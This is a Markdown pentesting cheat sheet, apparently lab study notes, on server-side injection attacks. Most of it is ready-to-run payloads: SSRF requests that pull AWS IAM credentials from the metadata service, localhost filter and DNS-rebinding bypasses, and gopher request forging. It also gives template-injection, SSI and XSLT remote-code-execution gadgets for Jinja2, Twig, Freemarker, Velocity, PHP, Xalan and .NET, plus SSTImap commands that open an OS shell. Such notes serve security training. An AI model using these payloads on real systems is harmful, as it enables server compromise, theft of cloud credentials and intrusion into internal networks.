# Server-Side Attacks

#SSRF #SSTI #SSI #XSLT #ServerSide #WebAppAttacks #RCE #LFI #InjectionAttacks

## What is this?

Server-side attacks target the application/server itself rather than the client (contrast with XSS). This note covers four injection classes: **SSRF** (server coerced into making unauthorized requests), **SSTI** (attacker code runs inside a server-rendered template), **SSI Injection** (attacker directives run inside Apache/IIS server-side includes), and **XSLT Injection** (attacker XSL elements run inside an XML→output transform). All four can escalate to LFI or RCE depending on engine/library configuration. Pairs with [[File Inclusion]], [[Command Injection]], [[Web Attacks]].

---

## Tools

| Tool | Use |
|---|---|
| `curl` / `Burp Suite` | Manual probing, Collaborator for OOB blind SSRF |
| `ffuf` | Port/endpoint fuzzing through an SSRF pivot |
| [Gopherus](https://github.com/tarunkant/Gopherus) | Generates `gopher://` payloads for MySQL, PostgreSQL, FastCGI, Redis, SMTP, Zabbix, memcache — requires Python 2 |
| [SSTImap](https://github.com/vladko312/SSTImap) | Maintained fork of `tplmap` — detects template engine, reads/writes files, drops an OS shell |
| [SSRFmap](https://github.com/swisskyrepo/SSRFmap) | Automates SSRF exploitation — internal port scan, cloud metadata fetch, fuzzing modules |
| `nc` | Confirm outbound SSRF connections (`nc -lnvp <port>`) |

---

## SSRF (Server-Side Request Forgery)

Any parameter where the server fetches a URL on your behalf (`dateserver=`, `url=`, `path=`, webhook fields, PDF/image-by-URL generators) is a candidate.

| Scheme | Effect |
|---|---|
| `http://` / `https://` | Normal request — reach internal endpoints, bypass WAFs/firewalls that only see the frontend |
| `file://` | Read local files (LFI) |
| `gopher://` | Send arbitrary raw bytes to a TCP socket — forge POST requests or speak to non-HTTP services (Redis, SMTP, MySQL) |

### Confirm

```bash
# Point the target parameter at your own listener
nc -lnvp 8000
curl -s "http://<TARGET_IP>:<PORT>/index.php" -d "dateserver=http://10.10.14.5:8000/ssrf&date=2024-01-01"
# A connection on your listener = confirmed SSRF

# Check whether the response is reflected (non-blind) or generic (blind)
curl -s "http://<TARGET_IP>:<PORT>/index.php" -d "dateserver=http://127.0.0.1/index.php&date=2024-01-01"
```

> [!note]
> If the coerced response body comes back to you, it's **non-blind** SSRF — full read access to whatever the server can reach. If you only get a generic success/failure message, it's **blind** — see below.

### Internal Port Scan

```bash
# Baseline a closed port's error string first, then filter it out
seq 1 10000 > ports.txt
ffuf -w ./ports.txt -u http://<TARGET_IP>/index.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" \
  -fr "Failed to connect to"
```

### Cloud Metadata

If the vulnerable server runs on AWS/Azure/GCP, the instance metadata service is reachable at a well-known link-local IP — often with no auth:

```bash
# AWS IMDSv1 — no token/header required, easiest cloud target to hit through SSRF
curl -s "http://<TARGET_IP>/index.php" -d "dateserver=http://169.254.169.254/latest/meta-data/&date=2024-01-01"
curl -s "http://<TARGET_IP>/index.php" -d "dateserver=http://169.254.169.254/latest/meta-data/iam/security-credentials/&date=2024-01-01"
curl -s "http://<TARGET_IP>/index.php" -d "dateserver=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>&date=2024-01-01"
# Returns AccessKeyId / SecretAccessKey / Token -> use directly with aws-cli

# Azure IMDS — needs a "Metadata: true" header (SSRF pivot usually can't add headers)
curl -s "http://<TARGET_IP>/index.php" -d "dateserver=http://169.254.169.254/metadata/instance?api-version=2021-02-01&date=2024-01-01"

# GCP metadata — needs a "Metadata-Flavor: Google" header (same caveat)
curl -s "http://<TARGET_IP>/index.php" -d "dateserver=http://metadata.google.internal/computeMetadata/v1/&date=2024-01-01"
```

> [!tip]
> Azure/GCP require a custom header the vulnerable request usually can't forward through a simple URL-fetch SSRF — try anyway, but AWS IMDSv1 is the reliable win since it needs no headers at all.

### Accessing Restricted / Internal Endpoints

A vhost the server trusts (e.g. `dateserver.htb`) may 403/refuse direct access but be reachable through the SSRF pivot:

```bash
# Baseline the 404, then fuzz for hidden endpoints via the SSRF param
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt \
  -u http://<TARGET_IP>/index.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" \
  -fr "Server at dateserver.htb Port 80"
```

### LFI via `file://`

```bash
curl -s "http://<TARGET_IP>/index.php" -d "dateserver=file:///etc/passwd&date=2024-01-01"
```

### Filter / WAF Bypass

Blacklists on `127.0.0.1`/`localhost` are trivially bypassed with alternate representations of the same address:

```bash
curl -s "http://<TARGET_IP>/index.php" -d "dateserver=http://2130706433/&date=2024-01-01"                # decimal
curl -s "http://<TARGET_IP>/index.php" -d "dateserver=http://0177.0.0.1/&date=2024-01-01"                 # octal
curl -s "http://<TARGET_IP>/index.php" -d "dateserver=http://0x7f000001/&date=2024-01-01"                 # hex
curl -s "http://<TARGET_IP>/index.php" -d "dateserver=http://127.1/&date=2024-01-01"                      # short form
curl -s "http://<TARGET_IP>/index.php" -d "dateserver=http://[::1]/&date=2024-01-01"                      # IPv6 loopback
curl -s "http://<TARGET_IP>/index.php" -d "dateserver=http://attacker.com@127.0.0.1/&date=2024-01-01"     # userinfo confusion — parser may read host after @
curl -s "http://<TARGET_IP>/index.php" -d "dateserver=http://127.0.0.1#attacker.com&date=2024-01-01"      # fragment confusion
```

> [!tip]
> If a whitelist check runs before the fetch, host a 302 redirect on your own server pointing at the real internal target — some SSRF filters validate only the first-hop URL, not where the redirect actually lands.

**DNS rebinding** — some filters resolve the hostname once to check it against a blacklist, then resolve it *again* when actually fetching. Point a domain you control at a DNS server that returns different answers on successive queries (first the real, allowed IP; then `127.0.0.1`/internal target) so the check and the fetch see different addresses:

```bash
# Use a rebinding service, e.g. 1u.ms — encodes two IPs, alternates between them on repeated lookups
curl -s "http://<TARGET_IP>/index.php" -d "dateserver=http://make-<ip1>-<ip2>.1u.ms/&date=2024-01-01"
```

> [!note]
> Rebinding only defeats filters that re-resolve DNS per-request rather than reusing the IP from the initial check — if the app resolves once and caches the IP, this won't work.

### SSRF via PDF / HTML-to-PDF Generators

A distinct surface: apps that render user-supplied or user-influenced HTML to PDF (wkhtmltopdf, headless Chrome/Puppeteer, Chromium print-to-PDF) will fetch anything referenced in that HTML server-side:

```html
<!-- Read local files -->
<iframe src="file:///etc/passwd" width="800" height="800"></iframe>

<!-- SSRF to internal services / cloud metadata -->
<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<iframe src="http://127.0.0.1:8080/admin"></iframe>

<!-- wkhtmltopdf specifically — local file read via --enable-local-file-access (often on by default in older versions) -->
<script>
  x=new XMLHttpRequest;
  x.open("GET","file:///etc/passwd",false);
  x.send();
  document.write(x.responseText);
</script>
```

> [!tip]
> Look for "export to PDF", "generate invoice", "print preview" features — anywhere user input (name, address, comments) ends up in a server-rendered document is a candidate.

### Gopher — Raw TCP / POST Requests

`http://` only gets you GET requests. `gopher://` sends arbitrary bytes to a TCP socket, letting you forge a POST or speak to non-HTTP internal services.

```bash
# Manually: build the raw HTTP request, URL-encode spaces (%20) and CRLF (%0D%0A),
# prefix with gopher://host:port/_
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

> [!warning]
> The gopher URL itself sits inside a POST parameter that's already URL-encoded — you must URL-encode the **entire gopher URL a second time** before sending, or you'll get a "Malformed URL" error.

```bash
# Automate payload generation instead of building gopher URLs by hand (needs python2.7)
git clone https://github.com/tarunkant/Gopherus && cd Gopherus
python2.7 gopherus.py --exploit mysql        # or: postgresql, fastcgi, redis, smtp, zabbix, phpmemcache, ...
```

### Blind SSRF

No reflected response. Confirm out-of-band first — it doesn't depend on the app's response body at all:

```bash
interactsh-client -server interactsh.com -n 1
curl -s "http://<TARGET_IP>/index.php" -d "dateserver=https://<generated>.oast.fun&date=2024-01-01"
# DNS/HTTP hit in the interactsh log = confirmed blind SSRF
```

If outbound DNS/HTTP is firewalled, fall back to differential behavior (error message A vs error message B) to still port-scan or enumerate files:

```bash
# Closed port / nonexistent file -> "Something went wrong!"
# Open port / existing file      -> different generic message (e.g. "date unavailable")
# Diff the two response bodies/sizes across your fuzz list — same technique as above,
# just filtering on the blind app's two possible outputs instead of a reflected error string
```

> [!note]
> Blind SSRF can't exfiltrate data directly, but differential responses still let you fingerprint open ports and existing files — useful recon even without RCE.

---

## SSTI (Server-Side Template Injection)

Occurs when user input lands in the **template string** itself (not just the values passed to it) before rendering.

### Confirm + Fingerprint Engine

```bash
# Polyglot — breaks syntax across nearly every engine, provokes a 500 if vulnerable
${{<%[%'"}}%\.

# Fingerprint decision tree — step 1, then branch on result
{{7*7}}
#  -> renders as 49?  yes: engine uses {{ }} syntax (Jinja2 or Twig) -> go to step 2
#                     no:  try ${7*7} instead (Freemarker/Mako use ${ } syntax)

{{7*'7'}}   # step 2 (only if {{7*7}} rendered) — Jinja2 -> 7777777   |   Twig -> 49
```

> [!tip]
> Test everywhere the value ends up rendered, not just URL/form params — headers (`User-Agent`, `Referer`), cookies, and JSON body fields all get run through the same template engine in plenty of apps.

### Jinja2 (Python — Flask/Django)

```jinja2
{{ config.items() }}
{{ self.__init__.__globals__.__builtins__ }}
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Twig (PHP — Symfony)

```twig
{{ _self }}
{{ "/etc/passwd"|file_excerpt(1,-1) }}
{{ ['id'] | filter('system') }}
```

> [!note]
> `file_excerpt` is a Symfony-added Twig filter, not core Twig — core Twig has no built-in file-read primitive.

### Freemarker (Java)

```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Velocity (Java — Confluence/Jira)

```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

### SSTImap (Automation)

```bash
git clone https://github.com/vladko312/SSTImap && cd SSTImap && pip3 install -r requirements.txt

python3 sstimap.py -u "http://<TARGET_IP>/index.php?name=test"                          # detect engine + capabilities
python3 sstimap.py -u "http://<TARGET_IP>/index.php?name=test" -D '/etc/passwd' './passwd'  # download file
python3 sstimap.py -u "http://<TARGET_IP>/index.php?name=test" -S id                     # run one command
python3 sstimap.py -u "http://<TARGET_IP>/index.php?name=test" --os-shell                # interactive shell
```

> [!tip]
> For other engines (Thymeleaf, Mako, Smarty, etc.), the identification/exploitation logic is the same — only the syntax changes. Check the PayloadsAllTheThings SSTI cheat sheet for the specific engine's RCE gadget.

---

## SSI Injection (Server-Side Includes)

Apache/IIS directive syntax embedded in HTML, commonly on `.shtml`/`.shtm`/`.stm` (but can be enabled on any extension — don't rule SSI out just because the extension looks ordinary).

| Directive | Purpose |
|---|---|
| `printenv` | Dump environment variables |
| `config errmsg="..."` | Change the SSI error message |
| `echo var="X"` | Print a variable (`DOCUMENT_NAME`, `DOCUMENT_URI`, `LAST_MODIFIED`, `DATE_LOCAL`) |
| `exec cmd="..."` | Execute a shell command — direct RCE |
| `include virtual="..."` | Include another file (web root only) |

```
<!--#printenv -->
<!--#exec cmd="id" -->
```

Occurs wherever user input is written into a file the server later serves as SSI (file upload into web root, user input echoed into a stored `.shtml` page).

### Confirm + Exploit

```bash
# Submit as the vulnerable field (e.g. a "name" that gets stored/reflected into an .shtml page)
<!--#printenv -->
<!--#exec cmd="id" -->
```

### Injection via HTTP Headers (Log Poisoning)

A second-order vector: if request headers get logged and an admin panel later serves those logs as `.shtml`/SSI-enabled content, you don't need a form field at all:

```bash
curl -s "http://<TARGET_IP>/" -A '<!--#exec cmd="id" -->'
curl -s "http://<TARGET_IP>/" -H 'Referer: <!--#exec cmd="id" -->'
```

> [!note]
> This fires when the log viewer is opened, not in this response — look for an admin/log-viewer page and confirm it actually parses SSI before relying on this path.

---

## XSLT Injection

Occurs when user input is inserted into XSL data before the XSLT processor transforms it, letting an attacker inject additional `<xsl:*>` elements that execute during output generation.

### Confirm

```bash
# Inject a broken tag to provoke a transform error
<
```

### Information Disclosure

```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

### LFI / SSRF

```xml
<!-- document() — core XSLT 1.0 function, works on libxslt/Saxon/Xalan regardless of backend language -->
<xsl:copy-of select="document('/etc/passwd')" />
<xsl:value-of select="document('/etc/passwd')" />

<!-- document() also fetches remote URLs — free SSRF from the same primitive -->
<xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/')" />

<!-- XSLT 2.0+ only -->
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />

<!-- libxslt with PHP functions enabled — works on XSLT 1.0 too -->
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

> [!tip]
> Try `document()` first — it's core XSLT 1.0, so it works regardless of the backend language, unlike `php:function()` which needs PHP interop enabled.

### RCE

```xml
<!-- PHP / libxslt -->
<xsl:value-of select="php:function('system','id')" />
```

```xml
<!-- Java / Xalan — extension-function namespaces bound to arbitrary classes -->
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
  xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
  <xsl:template match="/">
    <xsl:variable name="rtobject" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtobject,'id')"/>
    <xsl:value-of select="ob:toString($process)"/>
  </xsl:template>
</xsl:stylesheet>
```

```xml
<!-- .NET / System.Xml.Xsl.XslCompiledTransform — inline C#/JScript via msxsl:script -->
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:msxsl="urn:schemas-microsoft-com:xslt"
  xmlns:user="placeholder">
  <msxsl:script language="C#" implements-prefix="user">
    public string xml() {
      System.Diagnostics.Process.Start("cmd.exe", "/c calc.exe");
      return "pwned";
    }
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="user:xml()"/>
  </xsl:template>
</xsl:stylesheet>
```

> [!note]
> `msxsl:script` only executes under `XslCompiledTransform` with scripting explicitly enabled (`XsltSettings.TrustedXslt` / `EnableScript`) — disabled by default since .NET Framework 4.5.2. Xalan's Java extension functions require the app not to have locked down `FEATURE_SECURE_PROCESSING` on the `TransformerFactory`.

---

## Quick Reference

| Goal | Payload / Command |
|---|---|
| Confirm SSRF | point param at `nc -lnvp 8000` listener |
| SSRF internal port scan | `ffuf ... -d "url=http://127.0.0.1:FUZZ/" -fr "<closed-port-error>"` |
| SSRF cloud metadata (AWS) | `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` |
| SSRF IP filter bypass | `http://2130706433/` (decimal) · `http://0x7f000001/` (hex) · `http://[::1]/` |
| SSRF DNS rebinding | domain that resolves allowed IP first, `127.0.0.1` on re-lookup |
| SSRF via PDF generator | `<iframe src="file:///etc/passwd">` in rendered HTML |
| SSRF LFI | `url=file:///etc/passwd` |
| SSRF → forged POST | `gopher://host:port/_POST%20...` (double URL-encode the whole thing) |
| SSTI polyglot probe | `${{<%[%'"}}%\.` |
| SSTI engine fingerprint | `{{7*7}}` → `{{7*'7'}}` (Jinja2: `7777777`, Twig: `49`) |
| SSTI test surface | not just params — headers, cookies, JSON body fields |
| Jinja2 RCE | `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` |
| Twig RCE | `{{ ['id'] \| filter('system') }}` |
| Freemarker RCE | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| SSTImap shell | `python3 sstimap.py -u "<url>?name=test" --os-shell` |
| SSI RCE | `<!--#exec cmd="id" -->` |
| SSI via header (log poisoning) | `curl -A '<!--#exec cmd="id" -->' <target>` |
| XSLT confirm | inject `<` to break the transform |
| XSLT LFI/SSRF (language-agnostic) | `<xsl:value-of select="document('/etc/passwd')" />` |
| XSLT RCE (PHP) | `<xsl:value-of select="php:function('system','id')" />` |
| XSLT RCE (Java/Xalan) | `rt:exec($rtobject,'id')` via `java.lang.Runtime` extension namespace |
| XSLT RCE (.NET) | `<msxsl:script language="C#">` inline code block |

---

*Created: 2026-07-14*
*Updated: 2026-07-14*
*Model: claude-sonnet-5*
